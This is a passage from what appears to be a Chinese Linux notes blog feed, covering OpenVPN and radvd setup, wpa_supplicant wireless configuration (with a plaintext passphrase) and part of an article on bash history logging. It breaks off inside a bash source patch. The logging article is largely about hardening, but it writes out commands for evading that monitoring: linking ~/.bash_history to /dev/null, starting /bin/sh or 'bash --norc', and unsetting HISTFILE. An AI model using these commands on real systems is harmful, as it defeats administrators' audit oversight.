class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">client</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dev tap</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">proto udp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">remote 192.168.0.2 1194</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">;remote-random</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">resolv-retry infinite</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nobind</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">persist-key</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">persist-tun</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ca ca.crt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">auth-user-pass</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ns-cert-type server</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">;tls-auth ta.key 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">comp-lzo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">verb 3</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>同时将服务器端的ca.crt拷贝到X:\Program Files\OpenVPN\config\  目录下。
win7需要以管理员身份运行OpenVPN GUI ，使用daloradius里添加的账号密码登陆。</p><p>添加ipv6支持：</p><p>让openvpn客户端支持Ipv6网络，需要将openvpn使用的虚拟网卡与具有ipv6地址的物理网卡进行桥接，让openvpn监听在此桥接的虚拟网卡上，然后通过自动DHCP实现为客户端分配ipv6地址。</p><p>安装配置网卡桥接：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">yum  install bridge-utils</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>编辑bridge-start启动脚本，根据系统网络设备对应编辑。</p><p>下载radvd：<a href="http://www.litech.org/radvd/dist/radvd-1.8.tar.gz" target="_blank" rel="noopener noreferrer">http://www.litech.org/radvd/dist/radvd-1.8.tar.gz</a></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">tar  xf radvd-* &amp;&amp; cd radvd-*</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./configure --sysconfdir=/etc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">make &amp;&amp; make install</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>修改配置文件 vi /etc/radvd.conf</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">interface br0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    AdvSendAdvert on;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    MinRtrAdvInterval 3;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    MaxRtrAdvInterval 10;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    AdvDefaultPreference low;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    prefix 2001:250:1002:40::/64 //客户端IPv6前缀</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        AdvOnLink on;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        AdvAutonomous on;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        AdvRouterAddr on;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    };</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">};</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>参考文档：</p><p><a href="http://howtoforge.org/authentication-authorization-and-accounting-with-freeradius-and-mysql-backend-and-webbased-management-with-daloradius" target="_blank" rel="noopener noreferrer">Authentication, Authorization &amp; Accounting with FreeRadius &amp; MySQL backend &amp; web based Management with Daloradius</a></p>]]></content>
        <category label="openvpn" term="openvpn"/>
        <category label="freeradius" term="freeradius"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[使用wpa-supplicant配置无线网络]]></title>
        <id>/2011/05/05/centos-wpa-supplicant-wireless</id>
        <link href="https://itxx00.github.io/notes/blog/2011/05/05/centos-wpa-supplicant-wireless"/>
        <updated>2011-05-05T00:00:00.000Z</updated>
        <content type="html"><![CDATA[<blockquote><p>之前在使用桌面的过程中，发现如果需要连接无线网 ， 那么networkmanager是首选的，自动管理网卡，自动扫描信号，用起来各种舒服；但是突然有一天发现networkmanager干了某些我不期望它干的事情，于是果断yum remove之，由于一气之下remove掉了networkmanager，并没有考虑到还得用它来连接无线，导致后来发现需要连无线的时候极为不方便，最终发现可以使用wpa-supplicant来管理无线网络连接。</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><p>其实很多人都推荐用这个了wpa_supplicant，但是由于一直没有这个必要所以就一直没有学会使用，今天用了下感觉还真不错。 wpa_supplicant首先在/etc/init.d/wpa_supplicant 有一个启动控制脚本，然后有/etc/wpa_supplicant/wpa_supplicant.conf这个默认配置文件，还有一个/etc/sysconfig/wpa_supplicant的全局配置文件，</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="安装">安装<a class="hash-link" href="#安装" title="标题的直接链接">​</a></h3><p>使用yum安装：<code>yum install wpa_supplicant</code>，在/usr/share/doc下有大量的配置示例和文档，</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="配置">配置<a class="hash-link" href="#配置" title="标题的直接链接">​</a></h3><p>在使用它之前需要修改几个配置文件，首先是wpa_supplicant.conf  ,比如我的配置如下:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># cat /etc/wpa_supplicant/wpa_supplicant.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ctrl_interface=/var/run/wpa_supplicant</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ctrl_interface_group=wheel</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">network={</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ssid="yourssid"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#scan_ssid=1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">proto=WPA2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">key_mgmt=WPA-PSK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pairwise=CCMP</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">group=CCMP</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">psk="fightandfuck"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">priority=2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>关于这些信息可以先使用<code>iwlist  wlan0 scan</code> 命令扫描，并做相应调整。然后需要修改全局配置文件</p><p>cat /etc/sysconfig/wpa_supplicant</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">INTERFACES="-iwlan0"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DRIVERS="-Dwext"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">OTHER_ARGS="-f /var/log/wpa_supplicant.log -P /var/run/wpa_supplicant.pid"</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="启动">启动<a class="hash-link" href="#启动" title="标题的直接链接">​</a></h3><p>修改完这些后，即可使用<code>service wpa_supplicant start</code> 启动网卡并连接认证了，当然可能出现的情况是认证成功了但是网卡没有获取到ip地址，这个时候只需要手动dhclient一下或者写个ifcfg-wlan0并指定其使用dhcp然后ifup wlan0。</p><p>总之，方便适用。</p>]]></content>
        <category label="wpa-supplicant" term="wpa-supplicant"/>
        <category label="wireless" term="wireless"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[为Bash增加命令执行日志]]></title>
        <id>/2011/02/17/bash-history-logging</id>
        <link href="https://itxx00.github.io/notes/blog/2011/02/17/bash-history-logging"/>
        <updated>2011-02-17T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[descripts a method for adding history logging on bash shell]]></summary>
        <content type="html"><![CDATA[<blockquote><p>我们将修改bash的源码来实现”无敌”logging机制，也将看到”无敌”并不是真正的无敌。</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="一bash为何需要logging">一：bash为何需要logging<a class="hash-link" href="#一bash为何需要logging" title="标题的直接链接">​</a></h2><p>Bash堪称*nix世界使用最广泛的shell，其特性之一是历史命令(history)机制。此机制主要用于为用户提供方便－－少敲几下键盘，提高工作效率。然而，被广泛讨论的是bash_history可以用作logging机制以此来监控用户的活动。此文将对上述问题进行讨论并解释为啥logging机制在少数人面前会失效。我们将见到各种用于保护history文件的防御措施是如何不费吹灰之力或稍微费点力就被突破的。随着讨论的跟进，突破的限制也将变得更严，但这并不代表突破起来就更困难，与之相反大部分方法都是可以不费脑子的。最后，我们将修改bash的源码来实现”无敌”logging机制，也将看到”无敌”并不是真正的无敌。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="二加固bash_history">二：加固bash_history<a class="hash-link" href="#二加固bash_history" title="标题的直接链接">​</a></h2><p>假设你所管理的系统提供shell登录功能，你的用户当中有个别及其讨人厌的家伙，于是你想监控他的活动，因为你非常怀疑他半夜三更使用你所负责保护的CPU和系统资源作恶意行为（或是其他的，例如下毛片等）。我们暂且叫他小明（此处原文为Bob，Bob一名在国外经常用来指代坏蛋）。</p><p>因为所有用户都是使用bash作为默认shell，你开始着手修改bash的配置文件：</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="第1步">第1步<a class="hash-link" href="#第1步" title="标题的直接链接">​</a></h3><p>使bash历史记录文件和相关文件无法被删除或修改。</p><p>小明所做的第一件事应该是建立history到/dev/null的链接。</p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">bob$ </span><span class="token function" style="color:#d73a49">rm</span><span class="token plain"> ~/.bash_history</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bob$ </span><span class="token function" style="color:#d73a49">ln</span><span class="token plain"> -s /dev/null ~/.bash_history</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>这可以通过修改历史记录文件为只能被追加来进行阻止，执行以下命令来改变其属性：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># chattr +a /home/bob/.bash_history</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>这是使用文件系统附加属性来指定文件只能被追加，大多数文件系统支持此功能(例如ext2/3,XFS,JFS)。在FreeBSD上可以执行：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># sappnd /home/bob/.bash_history</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>你还应修改shell启动相关的其他文件的这个属性：</p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># chattr +a /home/bob/.bash_profile</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># chattr +a /home/bob/.bash_login</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># chattr +a /home/bob/.profile</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># chattr +a /home/bob/.bash_logout</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># chattr +a /home/bob/.bashrc</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>前三个文件在交互式bash shell（或非交互式sehll使用–login选项）调用时被读取(在读完全局配置文件/etc/profile后)。.bashrc文件只在当non-login交互式shell调用时被读取。这意味着当小明已登进系统后，用以下方法自己调用一个新shell时:</p><p><code>bob$ bash</code></p><p>此时只有.bashrc文件被读取，而上面所列的前三个配置文件不会再次被读取了。</p><p>做了以上属性的修改后再来做更进一步的”加固”，一个所谓的保护措施。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="第2步">第2步<a class="hash-link" href="#第2步" title="标题的直接链接">​</a></h3><p>配置 .bash*配置文件</p><p>所有的配置将针对.bashrc文件，因为其他三个配置文件本身会调用.bashrc，也就是说.bashrc无论如何都会被读取 (不管用户是否刚登录或是登录后手工调用bash shell)。</p><p>所以，所有修改都针对.bashrc的好处是可以防止小明登录后手工调用新的bash shell来跳过仅在.bash_profile,.bash_login,.profile三个配置文件中生效的配置选项，另一好处是这三个文件本身都会调用.bashrc，所以在首次登录系统时.bashrc当中的配置也会生效。</p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># cat &gt;&gt; /home/bob/.bashrc &lt;&lt; EOF</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token builtin class-name">shopt</span><span class="token plain"> -s histappend</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token builtin class-name">readonly</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">PROMPT_COMMAND</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">”history -a”</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> EOF</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>此处histappend选项的作用是让bash附加上最后一行$HISTSIZE给$HISTFILE文件（一般是~/.bash_history文件），不管交互式shell何时退出。默认的，bash每次均会覆盖$HISTFILE以保证只有一个session被保存以此来节约空间。</p><p>环境变量PROMPT_COMMAND会保存一条将被优先执行的命令，意思是说”history -a”命令将在用户执行命令前被优先执行，这将保证不管当前命令前一条是执行的什么，它将立即被追加进$HISTFILE，而不用等待整个会话结束再将历史命令从内存记录至硬盘。</p><p>此处的readonly作用是使变量不可修改以防止被小明覆盖掉或是直接屏蔽掉。</p><p>最后要完成的步骤是使所有与bash_history相关的环境变量都变为readonly:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">readonly HISTFILE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">readonly HISTFILESIZE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">readonly HISTSIZE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">readonly HISTCMD</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">readonly HISTCONTROL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">readonly HISTIGNORE</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="第3步">第3步<a class="hash-link" href="#第3步" title="标题的直接链接">​</a></h3><p>禁掉系统中所有其他shell，一般包括csh,tcsh,ksh。</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># chmod 750 csh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># chmod 750 tcsh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># chmod 750 ksh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>这将阻止小明把bash shell切换成其他shell。</p><p>现在，机敏点的管理员会抱怨上面的都是shit！</p><p>还有一个shell逃出了我们的掌控！在你看完以上叙述跳入浮想联翩之前，让我们来搞清一些事情。</p><p>很久很久以前… （你懂的），原本只有一个Bourne shell 或者叫sh，现如今，/bin/sh实际上是/bin/bash的一个链接。Bash在被调用时检查它是以哪个名字被调用的并以此来判断是不是调用sh，它试图模仿历史版本的sh的行为并和POSIX标准保持一致。</p><p>如果以交互式login shell或非交互式shell带上–login选项启动，它才读取/etc/profile和~/.profile来初始化配置。如果以交互式shell被调用，则试图解释$ENV变量，当$ENV非空则使用它的值当作默认配置并执行。我们将在本文的下一节讨论如何利用这点来秒杀bash的所有设置。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="三攻破logging机制">三：攻破logging机制<a class="hash-link" href="#三攻破logging机制" title="标题的直接链接">​</a></h2><p>现在是时候站在小明的角度来看下所有问题了。我们将验证上面的防御是如何一步步被攻破的。在实践中的可能性是无穷进的。</p><p>以下所提及的突破bash_history logging机制的技巧只是九牛一毛。</p><ul><li>方法1：使用Bourne shell –/bin/sh逃脱术</li></ul><p><code>$ /bin/sh</code></p><p>调用sh会导致bash模仿如前所述的历史版本sh而不会读取与bash直接相关的任何配置文件。因此，小明现在能够避开$HISTFILE变量了，</p><p>因为它已不再是readonly。</p><p><code>$ unset HISTFILE</code></p><p>这会使得logging机制在当前会话中直接萎掉，因为此变量控制的历史命令记录文件将会是空的。</p><p>注：也可以通过调用/bin/rbash（如果系统里存在的话）来实现相同效果，它会模仿受限版本的bash，和sh一样也是一个bash的链接，但是使用起来确实有些让人蛋疼。</p><ul><li>方法2：让bash不加载.bashrc配置文件</li></ul><p>可以通过以下方法实现：</p><p><code>$ /bin/bash –norc</code></p><p>这样即可禁止bash读取.bashrc从而被设置成readonly的变量变成了writeable，然后像下面这样做：</p><p><code>$ HISTFILE=</code></p><p>会清空$HISTFILE变量—&gt;无历史记录。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="四hacking-bash-使用syslog日志接口">四：Hacking bash-使用syslog日志接口<a class="hash-link" href="#四hacking-bash-使用syslog日志接口" title="标题的直接链接">​</a></h2><p>从以上我们很清楚地得出结论－－传统的加固bash_history的方法实际上都是扯淡。然而我们却可以更向前一步的hack bash本身来减少logging机制的脆弱性并提高其隐秘性。需要注意的是即便如此也是可以被攻破的。由于bash与内核的差距导致它并不是足够的健壮来作为一个logging设备，即便是hack了它的核心。</p><p>现在的想法是修改bash源码使用户键入的所有指令全部发送给syslog，由syslog将日志记录到/var/log目录下。我们将提供一个快速而且很黄很暴力的方法来实现这一目标－－这里，哪个用户键入的哪条指令将没有差别的被对待，而这也是可以被实现的。</p><p>我们的接口的最佳放置点是parse.y文件，它由bash的yacc语法组成。当一条指令在shell中被下达时bash解释器将迅速被调用。因此，将syslog钩子放置在解释器刚好完成它的工作前一点点，貌似是个好办法。需要修改的仅仅是增加两行代码：包含进syslog.h和设置syslog调用。我们使用了bash-3.2的源码：</p><div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">ithilgore@fitz</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">$diff </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">E </span><span class="token operator" style="color:#393A34">-</span><span class="token 